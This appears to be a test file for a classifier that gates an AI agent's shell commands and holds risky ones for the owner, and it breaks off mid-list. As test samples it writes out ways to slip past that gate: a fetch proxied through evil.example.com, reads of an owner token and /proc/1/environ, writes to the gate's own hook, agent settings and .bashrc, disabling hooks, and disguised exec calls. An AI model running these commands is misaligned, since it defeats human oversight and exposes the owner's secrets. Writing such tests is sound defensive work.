import { describe, expect, test } from "bun:test";
import { exampleCorpProfile } from "../org-profile/fixtures/example-corp.js";
import { createHash } from "crypto";
import { readFileSync } from "fs";
import { join, resolve } from "path";
import { classifyToolCall, defaultProbes, SCRATCH_COLLECTOR_ENV, type FloorProbes, type GitTree } from "./classify.js";
import type { FloorConfig, FloorVerdict } from "./gate.js";
import { outwardMatches } from "../persona/policy.js";

/*
 * Running Standup's own code from a Standup worktree: a package script, an
 * isolated collector, a load test. The code those runs load is this
 * repository's real source, which names Standup's data-dir helpers, its hook
 * paths and its ports as part of what it is. The machine around it is
 * virtual: the worktree sits under a fake data dir and reads through to this
 * checkout, so none of Standup's own path literals appear here.
 */

const REPO = resolve(import.meta.dir, "..", "..", "..", "..");
const HOME = join("/", "fake", "home");
const DATA = join(HOME, ".local", "share", "standup");
const ROOT = join(DATA, "worktrees", "standup", "feat-1");
const INSTALL = join("/", "fake", "install");
const ISO = join("/", "tmp", "standup-iso-1");

const config: FloorConfig = {
  v: 1,
  orgProfile: exampleCorpProfile(),
  collectorUrl: "http://127.0.0.1:7777",
  launchId: "11111111-2222-3333-4444-555555555555",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [join(INSTALL, "packages", "collector", "src", "floor")],
  installDir: INSTALL,
  protectedPaths: [join(DATA, "secrets"), join(DATA, "review-scratch"), join(DATA, "review-media")],
  worktreeRoots: [join(DATA, "worktrees")],
  tmpDirs: ["/tmp"],
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
};

const realPackage = JSON.parse(readFileSync(join(REPO, "package.json"), "utf8")) as { scripts: Record<string, string> };

/** An eval script that loads the floor's own gate, the way the Persona eval does. */
const PERSONA_EVAL = [
  'import { parseFloorConfig } from "../packages/collector/src/floor/gate.ts";',
  'import { classifyToolCall } from "../packages/collector/src/floor/classify.ts";',
  "const cases = JSON.parse(await Bun.file(process.argv[2] ?? \"cases.json\").text());",
  "for (const c of cases) console.log(classifyToolCall(c.call, parseFloorConfig(c.config)!));",
].join("\n");

/** A memory load test that reads the topology and starts the collector's store in a scratch dir. */
const MEM_LOAD = [
  'import { collectorPorts } from "../packages/shared/src/topology.ts";',
  'import { tmpdir } from "os";',
  'import { join } from "path";',
  "const dir = join(tmpdir(), `mem-load-${process.pid}`);",
  "console.log(dir, collectorPorts);",
  "for (let i = 0; i < 1000; i++) new Array(1000).fill(i);",
  "console.log(process.memoryUsage().rss);",
].join("\n");

/** A script that seeds a scratch collector's DB, found the way the collector finds its own. */
const SEED = [
  'import { Database } from "bun:sqlite";',
  'import { defaultDbPath } from "../packages/collector/src/db-path.ts";',
  "const db = new Database(defaultDbPath(), { create: true });",
  'db.run("create table if not exists seed (id integer primary key, name text)");',
  'db.run("insert into seed (name) values (?)", ["fixture"]);',
].join("\n");

/** A script that checks a local dev server and prints, but never requests, the docs it links to. */
const LINKS = [
  'const DOCS = "https://docs.example.com/standup/getting-started";',
  'const res = await fetch("http://127.0.0.1:5301/health", { method: "POST", body: "{}" });',
  'console.log(res.status, "see", DOCS, "or https://github.com/example/standup/issues");',
].join("\n");

/** A scratch seed script outside the worktree that loads the worktree's store and links a review and a repo it never requests. */
const SCRATCH_SEED = [
  'import { existsSync, rmSync } from "fs";',
  'import { join } from "path";',
  `import { openStore } from "${join(ROOT, "packages", "store", "src", "index.ts")}";`,
  'const base = existsSync("/var/tmp") ? "/var/tmp" : "/tmp";',
  'rmSync(join(base, "standup-seed-old"), { recursive: true, force: true });',
  "const store = openStore(process.env.DB_PATH!);",
  'store.upsertProject({ id: "p1", repo: "ssh://git.example.com/pkg/Standup", pipeline: "https://pipelines.example.com/pipelines/Standup" });',
  'store.createReviewPacket({ project: "p1", reviewUrl: "https://code.example.com/reviews/R-1234" });',
].join("\n");

/** A module that matches text with a named RegExp's `exec` and lists tool names as data. */
const NAMED_REGEX = [
  "const REVIEW_URL = /\\/reviews\\/(R-\\d+)/;",
  'export type Stage = "corp-review" | "deploy";',
  'export const STAGES: Stage[] = ["corp-review", "deploy"];',
  "export function reviewId(s: string): string | null {",
  "  return REVIEW_URL.exec(s)?.[1] ?? null;",
  "}",
].join("\n");

/** A plain list of the repository's paths, as `git ls-files` prints them. */
const GIT_PATHS = ["packages/collector/src/index.ts", "packages/shared/src/owner-token.ts", "packages/web/src/owner-proxy.ts", "packages/shared/src/topology.ts", ""].join("\n");

const VIRTUAL: Record<string, string> = {
  [join(ROOT, ".git")]: "gitdir: /fake/install/.git/worktrees/feat-1\n",
  [join(ROOT, "package.json")]: JSON.stringify({ ...realPackage, scripts: { ...realPackage.scripts, "persona-eval": "bun run scripts/persona-eval.ts", "mem-load": "bun run scripts/mem-load.ts" } }),
  [join(ROOT, "scripts", "persona-eval.ts")]: PERSONA_EVAL,
  [join(ROOT, "scripts", "mem-load.ts")]: MEM_LOAD,
  [join(ROOT, "scripts", "seed.ts")]: SEED,
  [join(ROOT, "scripts", "links.ts")]: LINKS,
  [join(INSTALL, "scripts", "persona-eval.ts")]: PERSONA_EVAL,
  [join(ISO, "rest.txt")]: GIT_PATHS,
  [join(ISO, "seed.ts")]: SCRATCH_SEED,
  [join(ISO, "home", "foo.test.ts")]: 'import { test, expect } from "bun:test";\ntest("x", () => expect(1).toBe(1));\n',
  [join(ROOT, "scripts", "named-regex.ts")]: NAMED_REGEX,
  [join(DATA, "standup.db")]: "",
  [join(DATA, "secrets", "owner.token")]: "secret",
};

/** Virtual files with an execute bit. */
const EXECUTABLE = new Set<string>();

/** The real path a virtual worktree or install path reads through to, or null for the rest of the virtual machine. */
function real(p: string): string | null {
  for (const base of [ROOT, INSTALL]) {
    if (p === base) return REPO;
    if (p.startsWith(`${base}/`)) return join(REPO, p.slice(base.length + 1));
  }
  return null;
}

let merged: GitTree | null = null;

/** `main` as though this checkout's tracked files, as they are on disk, were merged: the worktree's own scripts above are not. */
function mergedTree(): GitTree | null {
  if (merged) return merged;
  const head = defaultProbes().gitTree(REPO, "HEAD");
  if (!head) return null;
  const entries = new Map<string, { mode: string; oid: string }>();
  for (const [path, entry] of head.entries) {
    if (!/^100(?:644|755)$/.test(entry.mode)) continue;
    let bytes: Buffer;
    try {
      bytes = readFileSync(join(REPO, path));
    } catch {
      continue;
    }
    const oid = createHash(entry.oid.length === 64 ? "sha256" : "sha1").update(`blob ${bytes.length}\0`).update(bytes).digest("hex");
    entries.set(path, { mode: entry.mode, oid });
  }
  merged = { commit: head.commit, entries };
  return merged;
}

function probes(): Partial<FloorProbes> {
  const disk = defaultProbes();
  // The scratch root's tmux dir is made before a collector starts in it.
  const dirs = new Set<string>(["/", "/tmp", join(ISO, "tmux")]);
  for (const f of Object.keys(VIRTUAL)) for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) dirs.add(d);
  dirs.delete(join(ROOT, ".git"));
  const bare = (p: string) => (p.length > 1 ? p.replace(/\/+$/, "") : p);
  const exists = (p: string) => p in VIRTUAL || dirs.has(bare(p)) || (real(p) !== null && disk.exists(real(p)!));
  const isDirectory = (p: string) => !(p in VIRTUAL) && (dirs.has(bare(p)) || (real(p) !== null && disk.isDirectory(real(p)!)));
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    gitCommonDir: () => null,
    readFile: (p, max) => (p in VIRTUAL ? { ok: true, text: VIRTUAL[p]! } : real(p) !== null ? disk.readFile(real(p)!, max) : { ok: false, reason: "missing" }),
    exists,
    isDirectory,
    // Virtual files are plain data unless named executable; the checkout's own keep their mode on disk.
    executable: (p) => (p in VIRTUAL ? EXECUTABLE.has(p) : real(p) !== null ? disk.executable(real(p)!) : null),
    listDir: (raw) => {
      const p = bare(raw);
      if (!isDirectory(p)) return null;
      const virtual = Object.keys(VIRTUAL).concat([...dirs]).filter((f) => f.startsWith(`${p === "/" ? "" : p}/`)).map((f) => f.slice(p.length + 1).split("/")[0]!);
      const onDisk = real(p) !== null ? (disk.listDir(real(p)!) ?? []).filter((n) => n !== ".git") : [];
      return [...new Set([...virtual, ...onDisk])];
    },
    realpath: (p) => (exists(p) ? bare(p) : null),
    homeDir: () => HOME,
    // The classifying process's env is empty, so no verdict depends on the machine's (its XDG_CACHE_HOME, BUN_INSTALL, CLAUDE_CONFIG_DIR).
    env: () => undefined,
    awsAccount: () => null,
    gitTree: (dir, rev) => (dir === ROOT && rev === "main" ? mergedTree() : null),
    gitAncestor: () => null,
    gitBlob: () => ({ ok: false, reason: "missing" }),
  };
}

function bash(command: string, cwd = ROOT): FloorVerdict {
  return classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd }, config, probes());
}

function expectAllowed(command: string): void {
  const v = bash(command);
  expect({ command, verdict: v }).toEqual({ command, verdict: { action: "allow" } });
}

function expectOwnerOnly(command: string, cwd = ROOT): void {
  const v = bash(command, cwd);
  expect({ command, action: v.action, ownerOnly: v.action === "hold" && v.ownerOnly }).toEqual({ command, action: "hold", ownerOnly: true });
}

const ISO_ENV = `HOME=${ISO}/home DB_PATH=${ISO}/data/standup.db COLLECTOR_PORT=38777 WS_PORT=38778 STANDUP_LISTEN_PORT=38777 STANDUP_LISTEN_WS_PORT=38778`;

/** A complete isolation (classify.ts isolationRoot): every variable Standup's code finds its dirs by, under one root below /tmp. */
const FULL_ISO_ENV = [
  "env -u TMUX -u TMUX_PANE",
  ...Object.entries({
    HOME: "home",
    XDG_CONFIG_HOME: "xdg/config",
    XDG_DATA_HOME: "xdg/data",
    XDG_STATE_HOME: "xdg/state",
    XDG_CACHE_HOME: "xdg/cache",
    DB_PATH: "data/standup.db",
    STANDUP_SQLITE_PATH: "data/standup.db",
    KNOWLEDGE_DIR: "knowledge",
    STANDUP_INTERNAL_ROOT: "internal",
    STANDUP_PROJECT_DOCS_DIR: "docs",
    TMPDIR: "tmp",
    TMP: "tmp",
    TEMP: "tmp",
    TMUX_TMPDIR: "tmux",
  }).map(([k, v]) => `${k}=${ISO}/${v}`),
].join(" ");

/** The env that keeps a scratch collector off the network (SCRATCH_COLLECTOR_ENV). */
const SCRATCH_COLLECTOR_FLAGS = SCRATCH_COLLECTOR_ENV.map(([k, v]) => `${k}=${v}`).join(" ");

/*
 * Standup's own code run from a worktree with HOME and the data dir under /tmp
 * is held for the owner just as a plain run is. Reading it statically can't
 * tell isolation apart from a bypass: code identical to the install's still
 * acts on the real home dir, the git dir it shares with the install and the
 * worktree files it imports at run time, and the env it is handed is the
 * worker's to shape. These pin that, so a later change relaxes it on purpose.
 */
describe("Standup's own code run from a worktree with a /tmp HOME and data dir", () => {
  test("is held for the owner, as a plain run is", () => {
    for (const command of [
      `${ISO_ENV} bun run packages/collector/src/index.ts`,
      `tmux -L standup-iso-1 new-session -d -s iso '${ISO_ENV} bun run packages/collector/src/index.ts'`,
      `tmux -L standup-iso-live new-session -d -s iso "cd ${ROOT} && HOME=/tmp/standup-iso-live/home DB_PATH=/tmp/standup-iso-live/data/standup.db COLLECTOR_PORT=38777 WS_PORT=38778 STANDUP_LISTEN_PORT=38777 STANDUP_LISTEN_WS_PORT=38778 bun run packages/collector/src/index.ts > /tmp/standup-iso-live/collector.log 2>&1"`,
      "bun run scripts/seed.ts",
      "bun run packages/collector/src/index.ts",
    ]) expectOwnerOnly(command);
  });

  test("a seed script that opens its DB through db-path's defaultDbPath writes the scratch DB a /tmp DB_PATH names", () => {
    expectAllowed(`DB_PATH=${ISO}/data/standup.db bun run scripts/seed.ts`);
    expectOwnerOnly(`DB_PATH=${join(DATA, "standup.db")} bun run scripts/seed.ts`);
  });

  test("with every variable Standup's code finds its dirs by under one /tmp root, is an isolated scratch collector", () => {
    // Its data-dir names and helpers resolve under the root, and the commands its source only names, or hands its runner by name, are its text.
    expectAllowed(`${FULL_ISO_ENV} ${SCRATCH_COLLECTOR_FLAGS} PORT=17891 bun run packages/collector/src/index.ts`);
  });

  test("scripts that only import the floor's modules are allowed", () => {
    // What those modules' functions do runs only if the script calls them (import-only.test.ts).
    for (const command of [`${ISO_ENV} bun run persona-eval`, "bun run persona-eval"]) {
      const v = bash(command);
      expect({ command, action: v.action, ownerOnly: v.action === "hold" && v.ownerOnly, reserved: v.action === "hold" && !!v.ownerReserved }).toEqual({ command, action: "allow", ownerOnly: false, reserved: false });
    }
  });

  test("a script that imports the topology's module is Persona's to decide: a function it defines opens the collector port", () => {
    for (const command of [`${ISO_ENV} bun run mem-load`, "bun run mem-load"]) {
      const v = bash(command);
      expect({ command, verdict: v }).toMatchObject({
        command,
        verdict: { action: "hold", category: "unclassified", ownerOnly: false, reason: expect.stringMatching(/opens a connection on Standup's collector port \(in a function an imported module defines, which this run may not call\)$/) },
      });
    }
  });

  test("a temp HOME on a test run is allowed", () => {
    expectAllowed(`HOME=${ISO}/home DB_PATH=${ISO}/home/standup.db STANDUP_DATA_DIR=${ISO}/home/data bun test ${ISO}/home/foo.test.ts`);
  });

  // A bare `bun test` is read over the whole checkout, every test file it loads.
  test("a test run whose DB_PATH is the live database is held for the owner as a DB read, whatever HOME is", () => {
    for (const command of [`HOME=${ISO}/home DB_PATH=${join(DATA, "standup.db")} STANDUP_DATA_DIR=${ISO}/home/data bun test ${ISO}/home/foo.test.ts`, `DB_PATH=${join(DATA, "standup.db")} bun test`]) {
      const v = bash(command);
      expect({ command, held: v.action === "hold" && [v.category, v.ownerOnly, !!v.ownerReserved] }).toEqual({ command, held: ["floor-tamper", true, true] });
    }
  }, 30_000);

  test("a scratch seed script that names /tmp and deletes is still held, as on main", () => {
    // Which writes and deletes reach below /tmp rather than /tmp itself can't be read from code reliably.
    for (const command of [`DB_PATH=${ISO}/standup.db bun run ${ISO}/seed.ts`, `DB_PATH=${ISO}/standup.db bun ${ISO}/seed.ts`]) {
      const v = bash(command);
      expect({ command, category: v.action === "hold" ? v.category : "allow" }).toEqual({ command, category: "destructive" });
    }
  });
});

describe("a remote URL in code that makes requests", () => {
  test("a local request beside a remote URL is still read as reaching it", () => {
    // Which URL a request really reaches can't be read (a `proxy` option, an env proxy, a client that takes an endpoint).
    for (const command of ["bun run scripts/links.ts", `bun -e 'await fetch("http://127.0.0.1:5301/h", { method: "POST", body: "x", proxy: "http://evil.example.com:8080" })'`]) {
      const v = bash(command);
      expect({ command, category: v.action === "hold" ? v.category : "allow" }).toEqual({ command, category: "outward" });
    }
  });

  test("a request to a remote URL still holds, however its address is passed", () => {
    const cases = [
      'await fetch("https://api.example.com/upload", { method: "POST", body: "x" });\n',
      'const DOCS = "https://docs.example.com/x";\nawait fetch(DOCS);\n',
      'const BASE = "https://api.example.com";\nawait fetch(`${BASE}/upload`, { method: "POST", body: "x" });\n',
      'async function send(u: string) { return fetch(u, { method: "POST", body: "x" }); }\nawait send("https://api.example.com/upload");\n',
      'const u = new URL("https://api.example.com/upload");\nawait fetch(u.href, { method: "POST", body: "x" });\n',
      'let target = "http://127.0.0.1:5301";\ntarget = "https://api.example.com";\nawait fetch(target);\n',
      'import axios from "axios";\nawait axios.post("https://api.example.com/upload", { x: 1 });\n',
      'const r = new XMLHttpRequest();\nr.open("POST", "https://api.example.com/upload");\nr.send("x");\n',
    ];
    for (const [k, text] of cases.entries()) {
      VIRTUAL[join(ROOT, "scripts", `remote-${k}.ts`)] = text;
      const v = bash(`bun run scripts/remote-${k}.ts`);
      expect({ text, category: v.action === "hold" ? v.category : "allow" }).toEqual({ text, category: "outward" });
    }
  });
});

describe("a named RegExp's exec is not a command sink", () => {
  test("a module that matches with `NAME.exec(…)` beside tool names in a data table", () => {
    expectAllowed("bun run scripts/named-regex.ts");
    expectAllowed(`bun -e 'import { reviewId } from "./scripts/named-regex.ts"; console.log(reviewId("x/reviews/R-1"))'`);
  });

  test("child_process exec, execSync, execFile and Bun.spawn still run what they're handed", () => {
    const cases = [
      'import { exec } from "child_process";\nexec("git push origin HEAD");\n',
      'import { execSync } from "child_process";\nexecSync("git push origin HEAD");\n',
      'import { execFile } from "child_process";\nexecFile("git", ["push", "origin", "HEAD"]);\n',
      'const cp = require("child_process");\ncp.exec("git push origin HEAD");\n',
      'const CP = require("child_process");\nconst RE = /x/;\nCP.exec("git push origin HEAD");\n',
      'RegExp.prototype.exec = require("child_process").execSync;\nconst cp = /x/;\ncp.exec("git push origin HEAD");\n',
      'const cp = /x/;\nconst go = cp => cp.exec("git push origin HEAD");\ngo(require("child_process"));\n',
      'Bun.spawn(["git", "push", "origin", "HEAD"]);\n',
      'let RE = /x/;\nRE = require("child_process");\nRE.exec("git push origin HEAD");\n',
    ];
    for (const [k, text] of cases.entries()) {
      VIRTUAL[join(ROOT, "scripts", `sink-${k}.ts`)] = text;
      const v = bash(`bun run scripts/sink-${k}.ts`);
      expect({ text, category: v.action === "hold" ? v.category : "allow" }).toEqual({ text, category: "outward" });
    }
  });
});

describe("git's identity config is not a message", () => {
  test("`-c user.email=` and `git config user.email` in a scratch repo", () => {
    const repo = join(ISO, "repo");
    VIRTUAL[join(repo, ".git", "HEAD")] = "ref: refs/heads/main\n";
    expectAllowed(`cd ${repo} && git -c user.name=scratch -c user.email=scratch@example.invalid commit -qm init`);
    expectAllowed(`cd ${repo} && git config user.email scratch@example.invalid`);
    expectAllowed(`cd ${repo} && GIT_AUTHOR_EMAIL=scratch@example.invalid git commit -qm init`);
  });

  test("an address a command really writes to still holds", () => {
    const v = bash("echo hi | mail -s report bob@example.com");
    expect(v.action).toBe("hold");
  });

  test("prose naming git's identity settings beside an address is still a message", () => {
    for (const text of ["email the summary to user.email bob@example.com", "send the patch to GIT_AUTHOR_EMAIL=bob@example.com", "echo hi | mail -c user.email=bob@example.com"]) {
      expect({ text, categories: outwardMatches(text, { honorNegation: false }).map((m) => m.category) }).toEqual({ text, categories: ["message"] });
    }
  });
});

describe("a data file a one-liner reads is not code", () => {
  test("reading or formatting a list of paths that names the owner-token module", () => {
    expectAllowed(`bun -e 'const t = require("fs").readFileSync("${ISO}/rest.txt", "utf8"); console.log(t.split("\\n").filter(Boolean).length)'`);
    expectAllowed(`bun -e 'import { readFileSync } from "fs"; for (const p of readFileSync("${ISO}/rest.txt", "utf8").split("\\n")) console.log(p.padEnd(60), p.length)'`);
  });

  test("a real import or call of the owner-token helpers still holds", () => {
    expectOwnerOnly(`bun -e 'import { readOwnerToken } from "./packages/shared/src/owner-token.ts"; console.log(readOwnerToken())'`);
    expectOwnerOnly(`bun -e 'const { ownerTokenPath } = require("@standup/shared/owner-token"); console.log(require("fs").readFileSync(ownerTokenPath(), "utf8"))'`);
  });
});

describe("the real protections still hold for the owner", () => {
  test("a write to the live floor hook or install code", () => {
    expectOwnerOnly(`${ISO_ENV} bun run persona-eval > ${join(INSTALL, "packages", "collector", "src", "floor", "gate.ts")}`);
    expectOwnerOnly(`cp ${join(ROOT, "scripts", "persona-eval.ts")} ${join(INSTALL, "scripts", "persona-eval.ts")}`);
  });

  test("reads of the owner token or secrets", () => {
    expectOwnerOnly(`${ISO_ENV} bun run persona-eval ${join(DATA, "secrets", "owner.token")}`);
    expectOwnerOnly(`${ISO_ENV} STANDUP_OWNER_TOKEN_FILE=${join(DATA, "secrets", "owner.token")} bun run packages/collector/src/index.ts`);
    expectOwnerOnly(`cat ${join(DATA, "secrets", "owner.token")}`);
  });

  test("commands naming the real Standup DB", () => {
    expectOwnerOnly(`${ISO_ENV} bun run persona-eval ${join(DATA, "standup.db")}`);
    expectOwnerOnly(`HOME=${ISO}/home DB_PATH=${join(DATA, "standup.db")} bun run packages/collector/src/index.ts`);
    expectOwnerOnly(`sqlite3 ${join(DATA, "standup.db")} 'select 1'`);
  });

  test("/proc and other-process memory reads", () => {
    expectOwnerOnly(`${ISO_ENV} bun run persona-eval /proc/1/environ`);
    expectOwnerOnly("cat /proc/1/environ");
  });

  test("the live install's own code run from the install is install code, read for what it reaches", () => {
    expect(bash("bun run scripts/persona-eval.ts", INSTALL)).toEqual({ action: "allow" });
    expectOwnerOnly(`bun run scripts/persona-eval.ts ${join(DATA, "standup.db")}`, INSTALL);
  });

  test("worktree code run isolated that names a secret, the live DB or the floor by its absolute path", () => {
    const script = (name: string, text: string) => ({ [join(ROOT, "scripts", name)]: text });
    const cases: Array<[string, string]> = [
      ["secret.ts", `import { readFileSync } from "fs";\nconsole.log(readFileSync("${join(DATA, "secrets", "owner.token")}", "utf8"));\n`],
      ["db.ts", `import { Database } from "bun:sqlite";\nconsole.log(new Database("${join(DATA, "standup.db")}").query("select 1").all());\n`],
      ["dbdir.ts", `import { join } from "path";\nimport { Database } from "bun:sqlite";\nnew Database(join("${DATA}", "standup.db"));\n`],
      ["hook.ts", `import { writeFileSync } from "fs";\nwriteFileSync("${join(INSTALL, "packages", "collector", "src", "floor", "hook.ts")}", "");\n`],
      ["settings.ts", `import { writeFileSync } from "fs";\nwriteFileSync("${join(HOME, ".claude", "settings.json")}", "{}");\n`],
      ["environ.ts", `import { readFileSync } from "fs";\nconsole.log(readFileSync("/proc/1/environ", "utf8"));\n`],
    ];
    for (const [name, text] of cases) {
      Object.assign(VIRTUAL, script(name, text));
      expectOwnerOnly(`${ISO_ENV} bun run scripts/${name}`);
      expectOwnerOnly(`bun run scripts/${name}`);
    }
  });

  test("worktree code run isolated that calls the live collector's API", () => {
    VIRTUAL[join(ROOT, "scripts", "answer.ts")] = 'await fetch("http://127.0.0.1:7777/api/asks/a1/resolve", { method: "POST", body: "{}" });\n';
    const v = bash(`${ISO_ENV} bun run scripts/answer.ts`);
    expect(v.action === "hold" && [v.category, v.ownerOnly]).toEqual(["collector-api", true]);
  });

  test("an outward step in worktree code run isolated", () => {
    VIRTUAL[join(ROOT, "scripts", "push.ts")] = 'import { execSync } from "child_process";\nexecSync("git push origin HEAD");\n';
    const v = bash(`${ISO_ENV} bun run scripts/push.ts`);
    expect(v.action === "hold" && v.category).toBe("outward");
  });

});

/** Each script, written to the worktree, run isolated both ways; every one must hold for the owner. */
function expectEachOwnerOnly(cases: Record<string, string>, envs = [ISO_ENV, `DB_PATH=${ISO}/data/standup.db`]): void {
  for (const [name, text] of Object.entries(cases)) {
    VIRTUAL[join(ROOT, "scripts", name)] = text;
    for (const env of envs) expectOwnerOnly(`${env} bun run scripts/${name}`);
  }
}

describe("worker code run with a /tmp HOME or data dir that reaches past it", () => {
  const GATE = join(INSTALL, "packages", "collector", "src", "floor", "gate.ts");

  test("commands it runs that write the floor, settings, rc files or secrets", () => {
    expectEachOwnerOnly({
      "exec-floor.ts": `import { execSync } from "child_process";\nexecSync("cp /tmp/e.ts ${GATE}");\n`,
      "spawn-floor.ts": `import { spawnSync } from "child_process";\nspawnSync("cp", ["/tmp/e.ts", "${GATE}"]);\n`,
      "exec-settings.ts": `import { execSync } from "child_process";\nexecSync("cp /tmp/s.json ${join(HOME, ".claude", "settings.json")}");\n`,
      "exec-secrets.ts": 'import { execSync } from "child_process";\nexecSync("rm -rf ../../../secrets");\n',
    });
  });

  test("helpers handed an env or path of their own, and code that changes the run's env", () => {
    expectEachOwnerOnly({
      "tok-args.ts": 'import { ownerTokenPath, readOwnerToken } from "../packages/shared/src/owner-token.ts";\nconsole.log(readOwnerToken(ownerTokenPath({})));\n',
      "dir-args.ts": 'import { Database } from "bun:sqlite";\nimport { join } from "path";\nimport { standupDataDir } from "../packages/shared/src/owner-token.ts";\nnew Database(join(standupDataDir({}), "standup.db"));\n',
      "del-db.ts": 'import { defaultDbPath } from "../packages/collector/src/db-path.ts";\ndelete process.env.DB_PATH;\nconsole.log(defaultDbPath());\n',
      "set-db.ts": 'import { resolve } from "path";\nimport { defaultDbPath } from "../packages/collector/src/db-path.ts";\nprocess.env.DB_PATH = resolve(import.meta.dir, "..", "..", "..", "..", "standup.db");\nconsole.log(defaultDbPath());\n',
      "set-home.ts": 'import { readOwnerToken } from "../packages/shared/src/owner-token.ts";\nprocess.env["HOME"] = process.env.OLDHOME;\nconsole.log(readOwnerToken());\n',
      "user-home.ts": 'import { userInfo } from "os";\nimport { join } from "path";\nimport { Database } from "bun:sqlite";\nnew Database(join(userInfo().homedir, ".local", "share", "standup", "standup.db"));\n',
    });
  });

  test("a home-dir path in a run whose HOME is the worker's own", () => {
    expectEachOwnerOnly(
      { "dbhome.ts": 'import { homedir } from "os";\nimport { join } from "path";\nimport { Database } from "bun:sqlite";\nconsole.log(process.env.DB_PATH);\nnew Database(join(homedir(), ".local", "share", "standup", "standup.db"));\n' },
      [`DB_PATH=${ISO}/data/standup.db`],
    );
  });

  test("another process's /proc files, however the path is built", () => {
    expectEachOwnerOnly({
      "proc-fd.ts": 'import { readFileSync } from "fs";\nconst pid = 1, fd = 3;\nconsole.log(readFileSync(`/proc/${pid}/fd/${fd}`));\n',
      "proc-cwd.ts": 'import { readFileSync } from "fs";\nimport { join } from "path";\nconst pid = 1;\nconsole.log(readFileSync(join(`/proc/${pid}/cwd`, "..", "environ")));\n',
    });
  });

  test("a worker's script that matches no file of the live install's, even one named like it", () => {
    VIRTUAL[join(ROOT, "scripts", "add-project.ts")] = 'await fetch("http://127.0.0.1:7777/api/asks/a1/resolve", { method: "POST", body: "{}" });\n';
    const v = bash(`${ISO_ENV} bun run scripts/add-project.ts`);
    expect(v.action === "hold" && v.category).toBe("collector-api");
  });
});


describe("an org review CLI the command never runs", () => {
  const CASES = join(ROOT, "packages", "collector", "src", "persona-eval", "cases");
  const SRC = join(ROOT, "packages", "collector", "src");
  // An eval case's prose, which reads as shell with the review CLI's name after a `;`.
  const CASE = JSON.stringify([{ id: "silent-done-job", jobs: [{ title: "Bump croner", status: "done", outcome: "croner bumped to 10.0.1; tests green; corp-review cut." }] }], null, 2);

  test("python reading eval case files that mention the review CLI, then a grep", () => {
    for (const name of ["silence.json", "routing.json"]) VIRTUAL[join(CASES, name)] = CASE;
    const command = `cd ${SRC} && python3 -I -c "import json\\nfor f in ('persona-eval/cases/silence.json','persona-eval/cases/routing.json'): d=json.load(open(f))\\n for c in d: s=json.dumps(c); print(f,c['id'],s[:1500])"; grep -n "owner_responded_at = \\|ownerRespondedAt" -r ../../store/src/queries/persona.ts persona/*.ts | grep -v test | head`;
    const v = bash(command);
    expect(v.action === "hold" ? v.reason : "allow").toBe("allow");
    // The same files with an execute bit could be run, but code that runs no command runs none of them.
    for (const name of ["silence.json", "routing.json"]) EXECUTABLE.add(join(CASES, name));
    try {
      const v2 = bash(command);
      expect(v2.action === "hold" ? v2.reason : "allow").toBe("allow");
    } finally {
      for (const name of ["silence.json", "routing.json"]) EXECUTABLE.delete(join(CASES, name));
    }
  });

  test("a data file that is executable is still read as what it runs, by code that can run it", () => {
    const file = join(ROOT, "cases.json");
    VIRTUAL[file] = '["corp-review --draft --issue PROJ-1"]\n';
    const command = `python3 -I -c "import subprocess\\nfor f in ('${file}', 'x'): subprocess.run([f])"`;
    EXECUTABLE.add(file);
    try {
      expect(bash(command).action).toBe("hold");
      expect(bash(`python3 -I -c "for f in ('${file}', 'x'): print(open(f).read())"`)).toEqual({ action: "allow" });
    } finally {
      EXECUTABLE.delete(file);
    }
  });

  test("a real review CLI call still holds as a code review step", () => {
    for (const command of ["corp-review --draft", "corp-review --revise R-1", "cd /tmp && corp-review --draft --issue PROJ-1", `python3 -c "import subprocess; subprocess.run(['corp-review', '--all'])"`]) {
      const v = bash(command);
      expect({ command, category: v.action === "hold" ? v.category : "allow" }).toEqual({ command, category: "review" });
    }
  });
});

describe("awk's `>` inside print arguments", () => {
  test("a comparison in parentheses or a regex is not a redirect", () => {
    expectAllowed(`awk -F/ '{print (NF>1?$1"/":$1)}' f`);
    expectAllowed(`awk '{ printf("%s\\n", ($2 > 10 ? "big" : "small")) }' f`);
    expectAllowed(`awk '$0 ~ /a>b/ { print $1 }' f`);
  });

  test("a top-level redirect still holds", () => {
    // To a file named by a variable it is a write the floor can't place, which runs.
    expectAllowed("awk '{print $1 > file}' f");
    expectAllowed("awk '{printf \"%s\", $1 >> out}' f");
    for (const command of [
      `awk '{print > "${join(HOME, ".bashrc")}"}' f`,
      "awk -v file=.bashrc '{print $1 > file}' f",
      `awk '{print (x) > "${join(HOME, ".bashrc")}"}' f`,
      `awk '{print 1,/ 2 > "${join(HOME, ".bashrc")}"}' f`,
      `awk '{x = /(/; print x > "${join(HOME, ".bashrc")}"}' f`,
      `awk '{print (x > "${join(HOME, ".bashrc")}"}' f`,
      `awk '{print "a" > "${join(HOME, ".bashrc")}" "x"}' f`,
      `awk '{print "a" > "\\057fake\\057home\\057.bashrc"}' f`,
      `awk '{print i++ /2 > "${join(HOME, ".bashrc")}"}' f`,
    ]) {
      const v = bash(command);
      expect({ command, action: v.action }).toEqual({ command, action: "hold" });
    }
  });
});

describe("read-only shell the floor misread", () => {
  test("a search for the names of hook settings", () => {
    expectAllowed('grep -rn "allowedHttpHookUrls\\|allowManagedHooksOnly\\|httpHookAllowedEnvVars" packages scripts');
    expectAllowed("rg -n disableAllHooks packages");
    // Several searches joined by `;`, the same quoted pattern in more than one.
    expectAllowed(
      'grep -n "disableAllHooks" packages/collector/src/floor/isolated-self-runs.test.ts; grep -n "allowManagedHooksOnly" packages/collector/src/floor/isolated-self-runs.test.ts; grep -n "disableAllHooks\\|allowManagedHooksOnly" packages/collector/src/floor/classify.ts; grep -c "disableAllHooks" packages/collector/src/floor/classify.ts',
    );
  });

  test("setting or writing those names still holds", () => {
    for (const command of [
      `echo '{"disableAllHooks": true}' > ${join(ROOT, "x.json")}`,
      "grep -rn allowManagedHooksOnly packages > /tmp/out.txt && echo allowManagedHooksOnly",
      `echo '{"disableAllHooks":true}' > /tmp/s.json; grep Hooks f`,
      `grep() { printf '{"%s":true}' "$1" > /tmp/s.json; }; grep disableAllHooks`,
      "grep -o disableAllHooks f | xargs -I{} claude config set {} true",
